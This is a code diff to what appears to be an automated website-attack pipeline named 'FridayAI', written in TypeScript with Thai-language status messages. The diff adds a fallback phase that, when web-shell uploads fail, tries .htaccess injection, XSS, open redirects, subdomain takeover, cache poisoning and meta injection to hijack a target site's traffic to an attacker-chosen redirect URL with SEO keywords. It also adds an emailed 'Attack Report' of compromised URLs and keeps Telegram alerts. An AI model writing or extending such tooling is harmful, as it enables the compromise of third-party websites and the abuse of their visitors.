@@ -27,6 +27,7 @@ import { sendTelegramNotification, type TelegramNotification } from "./telegram-
 import { runWpAdminTakeover, runShellExecFallback, type WpAdminConfig, type WpTakeoverResult } from "./wp-admin-takeover";
 import { runWpDbInjection, type WpDbInjectionConfig, type WpDbInjectionResult } from "./wp-db-injection";
 import { proxyPool } from "./proxy-pool";
+import { runShelllessAttacks, type ShelllessResult, type ShelllessConfig } from "./shellless-attack-engine";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -61,7 +62,7 @@ export interface PipelineConfig {
 }
 
 export interface PipelineEvent {
-  phase: "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update";
+  phase: "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email";
   step: string;
   detail: string;
   progress: number; // 0-100
@@ -101,6 +102,8 @@ export interface PipelineResult {
   // WP Admin Takeover & DB Injection results
   wpAdminResults?: WpTakeoverResult[];
   wpDbInjectionResults?: WpDbInjectionResult[];
+  // Shellless attack results
+  shelllessResults?: ShelllessResult[];
   // Cloaking results
   cloakingShell?: CloakingShellResult | null;
   contentPack?: ContentPack | null;
@@ -108,6 +111,7 @@ export interface PipelineResult {
   injectionResult?: InjectionResult | null;
   cdnUploadResult?: CdnUploadResult | null;
   telegramSent?: boolean;
+  emailSent?: boolean;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -1282,7 +1286,117 @@ export async function runUnifiedAttackPipeline(
     }
   }
 
-  // ─── Phase 4.9: Cloaking (ONLY if upload succeeded) ───
+  // ─── Phase 5: Shellless Attacks (when ALL uploads failed) ───
+  let shelllessResults: ShelllessResult[] = [];
+
+  if (uploadedFiles.length === 0) {
+    onEvent({
+      phase: "shellless",
+      step: "start",
+      detail: `🔄 Phase 5: Shell upload ล้มเหลวทั้งหมด — เปลี่ยนไปใช้ Shellless Attack (10 methods: .htaccess injection, REST API, XSS, Open Redirect, Subdomain Takeover, Cache Poisoning, RSS/Sitemap, Meta Injection, Server Config, AI Creative)`,
+      progress: 90,
+    });
+
+    try {
+      // Collect data from previous phases for shellless attacks
+      const shelllessConfig: ShelllessConfig = {
+        targetUrl: config.targetUrl,
+        redirectUrl: config.redirectUrl,
+        seoKeywords: config.seoKeywords,
+        timeout: config.timeoutPerMethod || 30000,
+        discoveredCredentials: discoveredCredentials,
+        cmsType: prescreen?.cms || vulnScan?.cms?.type || "unknown",
+        originIp: originIp || undefined,
+        wpRestApi: !!(prescreen?.cms?.toLowerCase() === "wordpress" || vulnScan?.cms?.type === "wordpress"),
+        wpXmlRpc: !!(prescreen?.cms?.toLowerCase() === "wordpress" || vulnScan?.cms?.type === "wordpress"),
+        // Extract SQLi info from indirect attack results
+        sqliEndpoint: indirectResults.find(r => r.vector.includes("sqli") && r.success)?.fileUrl ?? undefined,
+        // Extract XSS endpoints from indirect results
+        xssEndpoints: indirectResults
+          .filter(r => r.vector.includes("xss") && r.success)
+          .map(r => ({ url: r.fileUrl || config.targetUrl, param: "q", type: "stored" })),
+        // Extract open redirects from config results
+        openRedirects: configResults
+          ?.filter(r => r.vector.includes("redirect") && r.success)
+          .map(r => ({ url: config.targetUrl, param: "url" })),
+        // DNS dangling CNAMEs from DNS attack results
+        danglingCnames: dnsResults
+          .filter(r => r.vector.includes("subdomain") && r.success)
+          .flatMap(r => r.data?.vulnerableSubdomains?.map(vs => ({ subdomain: vs.subdomain, cname: vs.cname })) || []),
+        // Config files discovered
+        configFiles: configResults
+          ?.filter(r => r.success)
+          .map(r => ({ path: r.vector, content: r.detail })),
+        onProgress: (method: string, detail: string) => {
+          onEvent({
+            phase: "shellless",
+            step: method,
+            detail: `🔧 ${detail}`,
+            progress: 92,
+          });
+        },
+      };
+
+      shelllessResults = await Promise.race([
+        runShelllessAttacks(shelllessConfig),
+        new Promise<ShelllessResult[]>((_, reject) =>
+          setTimeout(() => reject(new Error("Shellless attacks timeout")), 180000)
+        ),
+      ]);
+
+      const shelllessSuccesses = shelllessResults.filter(r => r.success);
+      const shelllessRedirects = shelllessResults.filter(r => r.success && r.redirectWorks);
+
+      if (shelllessSuccesses.length > 0) {
+        aiDecisions.push(`✅ Shellless attacks: ${shelllessSuccesses.length}/${shelllessResults.length} methods succeeded`);
+
+        // Add successful shellless results as "uploaded files" for downstream compatibility
+        for (const sr of shelllessSuccesses) {
+          uploadedFiles.push({
+            url: sr.injectedUrl || config.targetUrl,
+            shell: shells[0] || { id: "shellless", type: "shellless" as any, filename: sr.method, content: "", size: 0, mimeType: "text/html", headers: {} },
+            method: `shellless_${sr.method}`,
+            verified: sr.success,
+            redirectWorks: sr.redirectWorks || false,
+            httpStatus: 200,
+          });
+        }
+
+        onEvent({
+          phase: "shellless",
+          step: "success",
+          detail: `✅ Shellless Attack สำเร็จ! ${shelllessSuccesses.length} methods ทำงาน, ${shelllessRedirects.length} redirects — ไม่ต้องวางไฟล์เลย`,
+          progress: 95,
+          data: { shelllessResults, successCount: shelllessSuccesses.length },
+        });
+      } else {
+        onEvent({
+          phase: "shellless",
+          step: "complete",
+          detail: `⚠️ Shellless Attack ลอง ${shelllessResults.length} methods — ไม่มี method ไหนสำเร็จ`,
+          progress: 95,
+          data: { shelllessResults },
+        });
+      }
+    } catch (error: any) {
+      errors.push(`Shellless attacks failed: ${error.message}`);
+      onEvent({
+        phase: "shellless",
+        step: "error",
+        detail: `⚠️ Shellless Attack error: ${error.message}`,
+        progress: 95,
+      });
+    }
+  } else {
+    onEvent({
+      phase: "shellless",
+      step: "skipped",
+      detail: `⏭️ Shellless Attack ข้าม — มีไฟล์ที่วางสำเร็จแล้ว ${uploadedFiles.length} ไฟล์`,
+      progress: 95,
+    });
+  }
+
+  // ─── Phase 6: Cloaking (ONLY if upload/shellless succeeded) ───
   let injectionResult: InjectionResult | null = null;
   let cdnUploadResult: CdnUploadResult | null = null;
 
@@ -1493,6 +1607,8 @@ export async function runUnifiedAttackPipeline(
     // WP Admin Takeover & DB Injection results
     wpAdminResults: wpAdminResults.length > 0 ? wpAdminResults : undefined,
     wpDbInjectionResults: wpDbInjectionResults.length > 0 ? wpDbInjectionResults : undefined,
+    // Shellless attack results
+    shelllessResults: shelllessResults.length > 0 ? shelllessResults : undefined,
     // Cloaking results
     cloakingShell: cloakingResult || undefined,
     contentPack: contentPack || undefined,
@@ -1519,7 +1635,68 @@ export async function runUnifiedAttackPipeline(
     });
   }
 
-  // ─── Telegram Notification ───
+  // ─── Email Notification (primary) + Telegram (backup) ───
+  try {
+    const deployedUrls = uploadedFiles.map(f => f.url);
+    const shelllessSuccessCount = shelllessResults.filter(r => r.success).length;
+    const statusEmoji = success ? "✅" : (shelllessSuccessCount > 0 ? "⚠️" : "❌");
+    const statusText = success ? "SUCCESS" : (shelllessSuccessCount > 0 ? "PARTIAL (shellless)" : "FAILED");
+
+    // Build email body
+    const emailSubject = `${statusEmoji} FridayAI Attack Report: ${config.targetUrl} — ${statusText}`;
+    const emailBody = [
+      `# FridayAI Attack Report`,
+      ``,
+      `**Target:** ${config.targetUrl}`,
+      `**Redirect:** ${config.redirectUrl}`,
+      `**Status:** ${statusText}`,
+      `**Duration:** ${Math.round(result.totalDuration / 1000)}s`,
+      `**Keywords:** ${config.seoKeywords.join(", ")}`,
+      ``,
+      `## Results`,
+      `- Shells Generated: ${shells.length}`,
+      `- Upload Attempts: ${totalAttempts}`,
+      `- Files Deployed: ${uploadedFiles.length}`,
+      `- Verified: ${verifiedFiles.length}`,
+      `- Redirects Working: ${redirectWorkingFiles.length}`,
+      shelllessResults.length > 0 ? `- Shellless Methods: ${shelllessSuccessCount}/${shelllessResults.length} succeeded` : "",
+      injectionResult ? `- PHP Injected: ${injectionResult.injectedFiles?.length || 0} files` : "",
+      cloakingResult ? `- Cloaking: ${cloakingResult.type}` : "",
+      ``,
+      deployedUrls.length > 0 ? `## Deployed URLs\n${deployedUrls.map(u => `- ${u}`).join("\n")}` : "",
+      shelllessResults.filter(r => r.success).length > 0 ? `## Shellless Successes\n${shelllessResults.filter(r => r.success).map(r => `- **${r.method}**: ${r.detail}${r.injectedUrl ? ` → ${r.injectedUrl}` : ""}`).join("\n")}` : "",
+      errors.length > 0 ? `## Errors (top 5)\n${errors.slice(0, 5).map(e => `- ${e}`).join("\n")}` : "",
+      ``,
+      `## AI Decisions`,
+      aiDecisions.map(d => `- ${d}`).join("\n"),
+    ].filter(Boolean).join("\n");
+
+    // Send via notifyOwner (email)
+    const { notifyOwner } = await import("./_core/notification");
+    const emailResult = await notifyOwner({
+      title: emailSubject,
+      content: emailBody,
+    });
+    result.emailSent = emailResult;
+
+    if (emailResult) {
+      onEvent({
+        phase: "complete",
+        step: "email",
+        detail: `📧 Email แจ้งเตือนแล้ว`,
+        progress: 100,
+      });
+    }
+  } catch (emailErr: any) {
+    onEvent({
+      phase: "complete",
+      step: "email",
+      detail: `⚠️ Email ส่งไม่ได้: ${emailErr.message}`,
+      progress: 100,
+    });
+  }
+
+  // Telegram as backup
   try {
     const deployedUrls = uploadedFiles.map(f => f.url);
     const telegramPayload: TelegramNotification = {
@@ -1540,24 +1717,7 @@ export async function runUnifiedAttackPipeline(
 
     const telegramResult = await sendTelegramNotification(telegramPayload);
     result.telegramSent = telegramResult.success;
-
-    if (telegramResult.success) {
-      onEvent({
-        phase: "complete",
-        step: "telegram",
-        detail: `📩 Telegram แจ้งเตือนแล้ว`,
-        progress: 100,
-      });
-    }
-  } catch (tgErr: any) {
-    // Non-critical — don't fail pipeline for notification errors
-    onEvent({
-      phase: "complete",
-      step: "telegram",
-      detail: `⚠️ Telegram ส่งไม่ได้: ${tgErr.message}`,
-      progress: 100,
-    });
-  }
+  } catch { /* Telegram is backup, ignore errors */ }
 
   return result;
 }
